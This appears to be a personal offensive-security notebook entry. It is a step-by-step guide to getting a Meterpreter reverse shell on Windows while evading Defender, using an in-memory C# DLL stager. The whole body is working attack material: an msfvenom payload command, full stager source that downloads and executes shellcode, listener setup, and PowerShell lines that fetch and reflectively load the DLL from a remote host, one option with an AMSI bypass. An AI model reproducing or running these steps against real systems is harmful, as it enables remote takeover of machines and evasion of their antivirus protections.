---
categories:
  - "[[Security]]"
type: Technique
domain: Offensive
topics:
  - "[[Windows]]"
  - "[[Offensive Security]]"
status: Complete
platform:
  - Windows
severity:
cwe:
owasp:
tools:
  - Metasploit
created:
updated: 2025-07-16
---


**Summary:** This guide walks through loading and executing shellcode in memory on a Windows host using a C# DLL stager. You generate a Meterpreter payload, compile a small stager that fetches and runs it over HTTP, then load the DLL via PowerShell (or evil-winrm) and invoke it. No disk execution of the payload.

**Why this can bypass Windows Defender:** Defender (and most AV) relies heavily on **file-based scanning**: on-access and on-write checks when files land on disk. Here the payload and stager are **never written to disk**. Shellcode is downloaded into process memory and executed via `VirtualAlloc`/`CreateThread`, and in Option 2 the DLL is loaded with `[System.Reflection.Assembly]::Load($bytes)` from bytes already in memory, so there is no malicious file for Defender to scan. Execution uses normal Windows APIs from a trusted process (PowerShell/.NET), so it can slip past signatures and some behavioral heuristics that focus on suspicious binaries on disk. AMSI can still inspect PowerShell and .NET in memory, which is why Option 1 uses an AMSI bypass when loading the loader; in permissive or misconfigured environments, Option 2 may succeed without it.

---

## 1. Generate Meterpreter payload (Kali)

Output raw shellcode to `meterpreter.bin`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.235.132 LPORT=4444 -f raw -o meterpreter.bin
```

---

## 2. C# stager DLL

Create `dll-stager.cs`. **Set the URL to your Kali IP and port (e.g. where you serve the file).**

```csharp
using System;
using System.Net;
using System.Runtime.InteropServices;

public class Stager
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Execute()
    {
        WebClient wc = new WebClient();
        byte[] shellcode = wc.DownloadData("http://192.168.235.132:8000/meterpreter.bin");

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

---

## 3. Compile stager (Kali)

```bash
sudo apt install mono-devel
mono-csc /target:library /out:stager.dll dll-stager.cs
```

---

## 4. Start MSF listener (Kali)

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.235.132
set LPORT 4444
set EXITONSESSION false
exploit -j
```

---

## 5. Serve payload and DLL (Kali)

From the directory containing `meterpreter.bin` and `stager.dll`:

```bash
python3 -m http.server 8000
```

---

## 6. Run on Windows

### Option 1: evil-winrm (with AMSI bypass)

```powershell
# Bypass AMSI first (disable AV for this step if needed)
Bypass-4MSI

# Load stager from your web server (adjust IP/port to match your listener)
Dll-Loader -http http://172.16.56.132:8000/stager.dll

# Invoke the stager
[Stager]::Execute()
```

### Option 2: PowerShell only (recommended)

Load the DLL from your web host and execute:

```powershell
$wc = New-Object Net.WebClient
$bytes = $wc.DownloadData('http://192.168.235.132:8000/stager.dll')
[System.Reflection.Assembly]::Load($bytes)
[Stager]::Execute()
```

---

## 7. Confirm session

After `[Stager]::Execute()`, a Meterpreter session should appear in MSF. Interact with it:

```bash
sessions -l
sessions -i <id>
```

Example: `meterpreter > dir` lists the target user’s directory (e.g. `C:\Users\timmy`).

>[!caution] Have metasploit load [C Sharp](https://github.com/Flangvik/SharpCollection) compiled tools using donet assembly module